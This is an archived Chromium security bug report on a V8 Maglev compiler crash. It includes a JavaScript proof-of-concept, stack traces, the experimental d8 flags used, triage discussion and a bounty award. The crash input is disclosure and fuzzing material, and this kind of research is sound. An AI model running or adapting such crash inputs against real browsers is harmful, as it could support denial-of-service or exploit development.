# Security: unreachable code in maglev::MaglevGraphBuilder::VisitStaCurrentContextSlot

| Field | Value |
|-------|-------|
| **Issue ID** | [40062671](https://issues.chromium.org/issues/40062671) |
| **Status** | Fixed |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>Compiler>Maglev |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | wh...@gmail.com |
| **Assignee** | vi...@chromium.org |
| **Created** | 2023-01-15 |
| **Bounty** | $7,000.00 |

## Description

**This template is ONLY for reporting security bugs. If you are reporting a**  

**Download Protection Bypass bug, please use the "Security - Download**  

**Protection" template. For all other reports, please use a different**  

**template.**

**Please READ THIS FAQ before filing a bug: <https://chromium.googlesource.com>**  

**/chromium/src/+/HEAD/docs/security/faq.md**

**Please see the following link for instructions on filing security bugs:**  

**<https://www.chromium.org/Home/chromium-security/reporting-security-bugs>**

**Reports may be eligible for reward payments under the Chrome VRP:**  

**<http://g.co/ChromeBugRewards>**

**NOTE: Security bugs are normally made public once a fix has been widely**  

**deployed.**

**-------------------------**

v8 current HEAD

#0 v8::internal::maglev::NodeBase::properties() const () at ../../src/maglev/maglev-ir.h:1084  

#1 0x00007ffff6968781 in v8::internal::maglev::InterpreterFrameState::set(v8::internal::interpreter::Register, v8::internal::maglev::ValueNode\*) () at ../../src/maglev/maglev-interpreter-frame-state.h:264  

#2 0x00007ffff694e3fc in v8::internal::maglev::MaglevGraphBuilder::SetArgument(int, v8::internal::maglev::ValueNode\*) () at ../../src/maglev/maglev-graph-builder.cc:259  

#3 0x00007ffff6959a53 in v8::internal::maglev::MaglevGraphBuilder::TryBuildInlinedCall(v8::internal::compiler::JSFunctionRef, v8::internal::maglev::CallArguments&) () at ../../src/maglev/maglev-graph-builder.cc:2959  

#4 0x00007ffff695cf5c in v8::internal::maglev::MaglevGraphBuilder::TryBuildCallKnownJSFunction(v8::internal::compiler::JSFunctionRef, v8::internal::maglev::CallArguments&) () at ../../src/maglev/maglev-graph-builder.cc:3298  

#5 0x00007ffff695317c in v8::internal::maglev::MaglevGraphBuilder::ReduceCall(v8::internal::compiler::ObjectRef, v8::internal::maglev::CallArguments&, v8::internal::compiler::FeedbackSource const&, v8::internal::SpeculationMode) () at ../../src/maglev/maglev-graph-builder.cc:3345  

#6 0x00007ffff695d14a in v8::internal::maglev::MaglevGraphBuilder::ReduceCallForTarget(v8::internal::maglev::ValueNode\*, v8::internal::compiler::JSFunctionRef, v8::internal::maglev::CallArguments&, v8::internal::compiler::FeedbackSource const&, v8::internal::SpeculationMode) () at ../../src/maglev/maglev-graph-builder.cc:3358  

#7 0x00007ffff695d9c9 in v8::internal::maglev::MaglevGraphBuilder::BuildCall(v8::internal::maglev::ValueNode\*, v8::internal::maglev::CallArguments&, v8::internal::compiler::FeedbackSource&) () at ../../src/maglev/maglev-graph-builder.cc:3425  

#8 0x00007ffff695dd12 in v8::internal::maglev::MaglevGraphBuilder::BuildCallFromRegisterList(v8::internal::ConvertReceiverMode) () at ../../src/maglev/maglev-graph-builder.cc:3454  

#9 0x00007ffff695e21a in v8::internal::maglev::MaglevGraphBuilder::VisitCallAnyReceiver() () at ../../src/maglev/maglev-graph-builder.cc:3495  

#10 0x00007ffff68ddc0e in v8::internal::maglev::MaglevGraphBuilder::VisitSingleBytecode() () at ../../src/maglev/maglev-graph-builder.h:376  

#11 0x00007ffff68d665c in v8::internal::maglev::MaglevGraphBuilder::BuildBody() () at ../../src/maglev/maglev-graph-builder.h:99  

#12 0x00007ffff68d3260 in v8::internal::maglev::MaglevGraphBuilder::Build() () at ../../src/maglev/maglev-graph-builder.h:86  

#13 0x00007ffff68d2a75 in v8::internal::maglev::MaglevCompiler::Compile(v8::internal::LocalIsolate\*, v8::internal::maglev::MaglevCompilationInfo\*) () at ../../src/maglev/maglev-compiler.cc:375  

#14 0x00007ffff694b839 in v8::internal::maglev::MaglevCompilationJob::ExecuteJobImpl(v8::internal::RuntimeCallStats\*, v8::internal::LocalIsolate\*) () at ../../src/maglev/maglev-concurrent-dispatcher.cc:109  

#15 0x00007ffff581e5cc in v8::internal::OptimizedCompilationJob::ExecuteJob(v8::internal::RuntimeCallStats\*, v8::internal::LocalIsolate\*) () at ../../src/codegen/compiler.cc:497  

#16 0x00007ffff5835ca8 in v8::internal::(anonymous namespace)::CompileMaglev(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::JSFunction](javascript:void(0);), v8::internal::ConcurrencyMode, v8::internal::BytecodeOffset, v8::internal::(anonymous namespace)::CompileResultBehavior) () at ../../src/codegen/compiler.cc:1240  

#17 0x00007ffff58279e7 in v8::internal::(anonymous namespace)::GetOrCompileOptimized(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::JSFunction](javascript:void(0);), v8::internal::ConcurrencyMode, v8::internal::CodeKind, v8::internal::BytecodeOffset, v8::internal::(anonymous namespace)::CompileResultBehavior) () at ../../src/codegen/compiler.cc:1316  

#18 0x00007ffff5828de0 in v8::internal::Compiler::CompileOptimized(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::JSFunction](javascript:void(0);), v8::internal::ConcurrencyMode, v8::internal::CodeKind) () at ../../src/codegen/compiler.cc:2724  

#19 0x00007ffff66aed8a in v8::internal::\_\_RT\_impl\_Runtime\_CompileOptimized(v8::internal::Arguments<(v8::internal::ArgumentsType)0>, v8::internal::Isolate\*) () at ../../src/runtime/runtime-compiler.cc:139  

#20 0x00007ffff66ae7e8 in v8::internal::Runtime\_CompileOptimized(int, unsigned long\*, v8::internal::Isolate\*) () at ../../src/runtime/runtime-compiler.cc:98

## Timeline

### [Deleted User] (2023-01-15)

[Empty comment from Monorail migration]

### wh...@gmail.com (2023-01-15)

PoC
function main() {
        function v1(v2,v3,v4,v5) {
                if (v5) {
                        with (2.0) {
                                            const v7 = v5();

                        }

                }

        }
        for (let v8 = 0; v8 < 4002; v8++) {
                    const v9 = v1(v8,Float64Array,Float64Array,v1);

        }


}
main();


have different stack trace 
#FailureMessage Object: 0x7ffde6e62c90
==== C stack trace ===============================

    /home/uuu/v8_src.main/v8/out/x64.release/d8(v8::base::debug::StackTrace::StackTrace()+0x13) [0x5642b9183973]
    /home/uuu/v8_src.main/v8/out/x64.release/d8(+0x1a7405b) [0x5642b918305b]
    /home/uuu/v8_src.main/v8/out/x64.release/d8(V8_Fatal(char const*, ...)+0x170) [0x5642b91752d0]
    /home/uuu/v8_src.main/v8/out/x64.release/d8(+0x11a167e) [0x5642b88b067e]
    /home/uuu/v8_src.main/v8/out/x64.release/d8(v8::internal::maglev::MaglevGraphBuilder::VisitStaCurrentContextSlot()+0x4e) [0x5642b88a8b5e]
    /home/uuu/v8_src.main/v8/out/x64.release/d8(v8::internal::maglev::MaglevGraphBuilder::VisitSingleBytecode()+0x598) [0x5642b889a5d8]
    /home/uuu/v8_src.main/v8/out/x64.release/d8(v8::internal::maglev::MaglevGraphBuilder::TryBuildInlinedCall(v8::internal::compiler::JSFunctionRef, v8::internal::maglev::CallArguments&)+0x4b3) [0x5642b88b59c3]
    /home/uuu/v8_src.main/v8/out/x64.release/d8(v8::internal::maglev::MaglevGraphBuilder::TryBuildCallKnownJSFunction(v8::internal::compiler::JSFunctionRef, v8::internal::maglev::CallArguments&)+0x8e) [0x5642b88b9f1e]
    /home/uuu/v8_src.main/v8/out/x64.release/d8(v8::internal::maglev::MaglevGraphBuilder::ReduceCall(v8::internal::compiler::ObjectRef, v8::internal::maglev::CallArguments&, v8::internal::compiler::FeedbackSource const&, v8::internal::SpeculationMode)+0x1dc) [0x5642b88ac5ec]
    /home/uuu/v8_src.main/v8/out/x64.release/d8(v8::internal::maglev::MaglevGraphBuilder::BuildCall(v8::internal::maglev::ValueNode*, v8::internal::maglev::CallArguments&, v8::internal::compiler::FeedbackSource&)+0x14b) [0x5642b88ba9bb]
    /home/uuu/v8_src.main/v8/out/x64.release/d8(v8::internal::maglev::MaglevGraphBuilder::BuildCallFromRegisterList(v8::internal::ConvertReceiverMode)+0x187) [0x5642b88babd7]
    /home/uuu/v8_src.main/v8/out/x64.release/d8(v8::internal::maglev::MaglevGraphBuilder::VisitSingleBytecode()+0x856) [0x5642b889a896]
    /home/uuu/v8_src.main/v8/out/x64.release/d8(v8::internal::maglev::MaglevGraphBuilder::BuildBody()+0x6f) [0x5642b8899d8f]
    /home/uuu/v8_src.main/v8/out/x64.release/d8(v8::internal::maglev::MaglevCompiler::Compile(v8::internal::LocalIsolate*, v8::internal::maglev::MaglevCompilationInfo*)+0x2da) [0x5642b8898d3a]
    /home/uuu/v8_src.main/v8/out/x64.release/d8(v8::internal::maglev::MaglevCompilationJob::ExecuteJobImpl(v8::internal::RuntimeCallStats*, v8::internal::LocalIsolate*)+0x6b) [0x5642b88a550b]
    /home/uuu/v8_src.main/v8/out/x64.release/d8(+0xb79458) [0x5642b8288458]
    /home/uuu/v8_src.main/v8/out/x64.release/d8(v8::internal::Compiler::CompileOptimized(v8::internal::Isolate*, v8::internal::Handle<v8::internal::JSFunction>, v8::internal::ConcurrencyMode, v8::internal::CodeKind)+0x8a) [0x5642b828a55a]
    /home/uuu/v8_src.main/v8/out/x64.release/d8(v8::internal::Runtime_CompileOptimized(int, unsigned long*, v8::internal::Isolate*)+0x140) [0x5642b87a9980]
    [0x56423fed9d78]


run d8 with "--expose-gc --future --harmony --assert-types --maglev-assert --turboshaft-assert-types --harmony-rab-gsab --harmony-struct --allow-natives-syntax --interrupt-budget=1000 --fuzzing --maglev --maglev-inlining  --turbo-compress-translation-arrays  --turboshaft  --verify-heap --flush-baseline-code"

### dc...@chromium.org (2023-01-17)

Unfortunately, per other recent security bugs, --maglev-inlining is off by default and is still in active development and not yet ready for fuzzing.

[Monorail components: Blink>JavaScript>Compiler>Maglev]

### dc...@chromium.org (2023-01-17)

Actually there was some discussion internally; it seems the proper way to handle these is to tag with a proper severity but mark as SI-None, so we know these will be fixed before launch.

### cl...@chromium.org (2023-01-17)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5173824160202752.

### bo...@google.com (2023-01-18)

It loos like ClusterFuzz wasn't able to reproduce a crash with this POC. 

As with crbug.com/1407471, I'll give the V8 folks a few days to take a look as dcheng suggested, and I plan to close/WontFix on Monday if nothing else happens here in the meantime.

### bo...@google.com (2023-01-21)

Just making an assignment (somewhat arbitrarily) for triage completeness. 

@V8 Googlers, I've been lumping Maglev in with other compiler issues, which I hope is OK with y'all. Please consider adding a named contact to go/v8-issue-triage-how-to for Maglev reports so sheriffs avoid spamming the wrong owners. 

### ja...@chromium.org (2023-02-01)

I've reached out to tebbi to respond to https://crbug.com/chromium/1407475#c7.

### ja...@chromium.org (2023-02-01)

I just noticed there was a different contact for Maglev. Reassigning to leszeks@

### ja...@chromium.org (2023-02-01)

leszeks, could you take a look and provide some input? Thanks!

### le...@chromium.org (2023-02-02)

--maglev-inlining is known to have issues, we're currently figuring out a way to mark it experimental for security researchers to not waste time investigating it.

### vi...@chromium.org (2023-03-03)

Thanks for the bug report. I cannot repro your bug in ToT. I believe this has been fixed.
Can you please identify which CL fixed this issue?

### [Deleted User] (2023-03-03)

[Empty comment from Monorail migration]

### [Deleted User] (2023-03-03)

[Empty comment from Monorail migration]

### am...@google.com (2023-03-09)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2023-03-09)

Congratulations! The VRP Panel has decided to award you $7,000 for this report. Thank you for reporting this issue. Generally we would not reward given that this issue wasn't reproducible, but this issue wasn't closed as a WontFix or conveyed to not be security bug, nor was a pre-existing CL linked to this bug, we're going to err on the side of fairness and extend a reward, so that is worth noting here as it should not set expectations for how similar future issues are handled. Thanks again! 

### wh...@gmail.com (2023-03-10)

Thank you very much.

### am...@google.com (2023-03-11)

[Empty comment from Monorail migration]

### [Deleted User] (2023-06-09)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2023-06-09)

This issue was migrated from crbug.com/chromium/1407475?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40062671)*
